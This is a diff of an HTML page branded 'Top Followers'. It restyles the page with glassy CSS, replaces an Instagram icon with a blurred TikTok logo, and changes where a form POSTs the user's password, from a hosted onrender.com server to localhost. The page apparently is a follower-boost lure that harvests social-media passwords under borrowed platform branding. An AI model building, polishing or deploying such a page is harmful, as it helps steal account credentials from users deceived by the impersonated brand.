@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Register for Top Follows</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -18,29 +17,49 @@
             position: relative;
         }
 
-        .instagram-logo-background {
+        .tiktok-logo-background {
+            background: url("./img.png");
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            width: 100vw;
+            height: 100vh;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center center;
             position: absolute;
-            font-size: 500px; /* Adjust size as needed */
-            color: rgba(193, 53, 132, 0.1); /* Instagram gradient color with transparency */
+            font-size: 0;
             z-index: 0;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none; /* Allow clicks to pass through */
+            pointer-events: none;
+            filter: blur(5px);
+        }
+
+        /* Responsive: On small screens, use cover for better fit */
+        @media (max-width: 600px) {
+            .tiktok-logo-background {
+           
+                background-size: cover;
+                filter: blur(3px);
+            }
         }
 
         .container {
-            background-color: #ffffff1f;
+            background: rgba(206, 207, 204, 0.2); /* More glassy, semi-transparent */
+            backdrop-filter: blur(10px); /* Frosted glass effect */
+            -webkit-backdrop-filter: blur(10px); /* Safari support */
+            border: 1px solid rgba(255, 255, 255, 0.3); /* Subtle border for glass look */
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            color: black;
+            box-shadow: 0 4px 10px rgba(226, 221, 221, 0.774);
             text-align: center;
             z-index: 1; /* Ensure container is above the logo */
             position: relative;
         }
 
         h1 {
-            color: #333;
+            color: #13cda185;;
             margin-bottom: 30px;
             font-size: 2.5em;
             letter-spacing: 2px;
@@ -55,14 +74,16 @@
         .input-group label {
             display: block;
             margin-bottom: 8px;
-            color: #555;
+            color: #eeeeee;
             font-weight: bold;
         }
 
         .input-group input {
             width: 100%;
             padding: 12px;
-            border: 1px solid #ddd;
+            border: 1px solid #f7f7f7;
+            background-color: rgba(255, 0, 0, 0.016);
+            color: white;
             border-radius: 5px;
             box-sizing: border-box; /* Include padding in width */
             font-size: 1em;
@@ -109,9 +130,7 @@
     </style>
 </head>
 <body>
-    <div class="instagram-logo-background">
-        <i class="fab fa-instagram"></i>
-    </div>
+    <div class="tiktok-logo-background"></div>
 
     <div class="container">
         <h1>Top Followers</h1>
@@ -158,7 +177,7 @@
                 const password = passwordInput.value;
 
                 try {
-                    const response = await fetch('https://top-follower.onrender.com', {
+                    const response = await fetch('http://localhost:3000', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
